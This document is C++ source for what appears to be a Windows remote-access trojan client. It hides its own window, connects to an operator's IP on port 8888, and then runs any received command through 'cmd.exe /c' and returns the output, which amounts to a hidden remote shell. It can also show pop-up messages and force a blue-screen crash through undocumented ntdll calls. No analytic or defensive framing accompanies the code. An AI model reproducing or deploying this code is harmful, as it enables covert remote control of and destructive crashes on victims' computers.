#include<iostream>  
#include<winsock.h>  
#include<cstring> 
#include<string>
#include<direct.h> 
using namespace std;
string ip;  
char ch[10001];
char buffer[10001];
char server_name[32];
int relen;
int selen;
WSADATA wsaData;
SOCKET ClientSocket;
char client_name[32]; 
string getCmdResult(const char*strCmd)  
{
	char buf[10001]={0};
	FILE *pf =NULL;
	if((pf=popen(strCmd, "r"))==NULL)
	{
		return "";
	}  
	string strResult;
	while(fgets(buf,sizeof(buf),pf))
	{
		strResult+=buf;
	}
	pclose(pf);
	return strResult;
}
void BSOD()
{
	HMODULE ntdll = LoadLibrary("ntdll.dll");
 	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");
 	FARPROC NtRaiseHardErr=GetProcAddress(ntdll,"NtRaiseHardError");
 	unsigned char ErrKill;
 	long unsigned int HDErr;
 	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13,true,false,&ErrKill);
 	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xc0000233,0,0,0,6,&HDErr);
}
int main()
{  
    WSAStartup(MAKEWORD(2,2),&wsaData);
    ClientSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);  
    if(ClientSocket==INVALID_SOCKET)  
    {  
        cout<<"ERROR";  
        WSACleanup();  
        return 0;  
    }  
    SOCKADDR_IN ServerAddr;  
    ServerAddr.sin_family=AF_INET; 
    USHORT uPort=8888; 
    ServerAddr.sin_port=htons(uPort); 
    cout<<"Please input the Remote Command Sender\'s IP:";
    cin>>ip;
    ServerAddr.sin_addr.S_un.S_addr=inet_addr(ip.c_str());  
	ShowWindow(GetForegroundWindow(),0); 
    cin.getline(client_name,32);  
    connect(ClientSocket,(SOCKADDR*)&ServerAddr,sizeof(ServerAddr));  
    cout<<"OK\n";    
    while(1)  
    {   
        while(1)
		{  
            memset(buffer,0,sizeof(buffer));
            relen=recv(ClientSocket,buffer,sizeof(buffer),0);  
            for(int i=0;i<=relen;i++)
            {
            	buffer[i]=tolower(buffer[i]);
			}
			if(buffer[0]=='m'&&buffer[1]=='s'&&buffer[2]=='g')
			{
				for(int i=4;i<strlen(buffer);i++)
				{
					ch[i-4]=buffer[i];
				}
				MessageBox(GetForegroundWindow(),ch,"Message",MB_OK);
				send(ClientSocket,"Message send successfully.",strlen("Message send successfully."),0);	
			}
			else if(buffer[0]=='c'&&buffer[1]=='d')
			{
				for(int i=3;i<strlen(buffer);i++)
				{
					ch[i-3]=buffer[i];
				}
				if(ch[0]!='\0')
				{
					chdir(ch);
				}
				char*ch1;
				ch1=getcwd(NULL,0);
				send(ClientSocket,ch1,strlen(ch1),0);
			}
			else if(string(buffer)=="exit")
			{
				WSACleanup();
				return 0;
			}
            else if(string(buffer)=="bsod")
			{
				send(ClientSocket,"No result", sizeof("No result"), 0);
				BSOD();
			} 
            else
			{
				sprintf(ch,"cmd.exe /c %s",buffer);
				string s=getCmdResult(ch);
				string buf="";
				memset(ch,0,sizeof(ch)); 
				if(s=="")
				{
					buf="No result";
				}
				else
				{
					for(int i=0;i<s.size();i++)
					{
						ch[i]=s[i];
					}
					buf=ch;
				}
				send(ClientSocket,buf.c_str(),buf.size(),0);
			}
			memset(ch,0,sizeof(ch));
        }  
    }  
}  
